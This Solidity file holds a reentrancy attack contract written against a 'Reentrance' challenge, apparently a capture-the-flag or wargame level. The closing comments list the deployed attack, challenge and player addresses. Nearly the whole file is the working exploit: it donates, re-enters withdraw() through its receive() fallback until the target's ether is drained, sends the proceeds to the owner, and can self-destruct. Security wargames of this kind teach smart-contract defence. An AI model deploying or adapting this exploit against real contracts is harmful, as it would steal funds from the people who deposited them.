// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint);
    function withdraw(uint _amount) external;
}

contract ReentranceAttack {

    IReentrance public challenge;
    address public owner;
    uint256 public donationAmount;

    
    constructor(address payable _challenge) {
        challenge = IReentrance(_challenge);
        owner = tx.origin;
        // challenge.donate{value: initialDonation}(address(this));
    }

    function attack() public payable {
        require(msg.value >= 0.1 ether, "Attack with at least 0.1 ether");
        challenge.donate{value:msg.value}(address(this));
        donationAmount = msg.value;
        attackLoop();
    }

    function attackLoop() private {
        uint256 balanceLeftToTake = address(challenge).balance;
        uint256 amountToTake = donationAmount < balanceLeftToTake ? donationAmount : balanceLeftToTake;
        if(0 < amountToTake){
            challenge.withdraw(amountToTake);
        }
    }
    
    receive() external payable {
        attackLoop();
    }

    function extractFunds() public {
        uint amount = address(this).balance;
        (bool success, ) = owner.call{value:amount}("");
        require(success, "Failed to send Ether");
    }

    function destroy() public {
        require(msg.sender == owner, "Can only be called by owner");
        selfdestruct(payable(owner));
    }

}
// attack contract:    0x9FfDD06eC9BA75c03FCB99F0f999352ca97a7a00
// challenge contract: 0x886809e6F387AF9Fb2A7D8d0EaE1d35A896f2090
// player address: 0x3De7502F63aF4619f8cbffb16EE7cD785f4eb895
// 0.1 eth in wei: 100000000000000000
// 0x886809e6F387AF9Fb2A7D8d0EaE1d35A896f2090, 0x3De7502F63aF4619f8cbffb16EE7cD785f4eb895